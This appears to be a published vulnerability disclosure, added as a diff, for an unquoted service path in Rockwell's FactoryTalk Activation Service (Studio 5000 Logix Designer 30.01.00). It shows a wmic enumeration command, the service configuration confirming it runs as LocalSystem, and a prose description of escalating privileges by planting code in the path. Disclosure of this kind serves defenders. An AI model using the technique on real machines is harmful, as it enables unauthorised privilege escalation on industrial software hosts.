@@ -1,0 +1,37 @@
+# Exploit Title: Studio 5000 Logix Designer 30.01.00 - 'FactoryTalk Activation Service' Unquoted Service Path
+# Discovery by: Luis Martinez
+# Discovery Date: 2019-11-18
+# Vendor Homepage: https://www.rockwellautomation.com/en_NA/overview.page
+# Software Link : https://www.rockwellautomation.com/en_NA/products/factorytalk/overview.page?pagetitle=Studio-5000-Logix-Designer&docid=924d2f2060bf9d409286937296a18142
+# Rockwell Automation Technologies
+# Tested Version: 30.01.00
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 10 Pro x64 es
+
+# Step to discover Unquoted Service Path: 
+
+C:\>wmic service get name, pathname, displayname, startmode | findstr "Auto" | findstr /i /v "C:\Windows\\" | findstr /i "Rockwell" |findstr /i /v """
+
+FactoryTalk Activation Service		FactoryTalk Activation Service 		C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\lmgrd.exe	Auto
+
+# Service info:
+
+C:\>sc qc "FactoryTalk Activation Service"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: FactoryTalk Activation Service
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\lmgrd.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : FactoryTalk Activation Service
+        DEPENDENCIES       : winmgmt
+                           : wmiapsrv
+                           : +NetworkProvider
+        SERVICE_START_NAME : LocalSystem
+
+#Exploit:
+
+A successful attempt would require the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could potentially be executed during application startup or reboot. If successful, the local user's code would execute with the elevated privileges of the application.
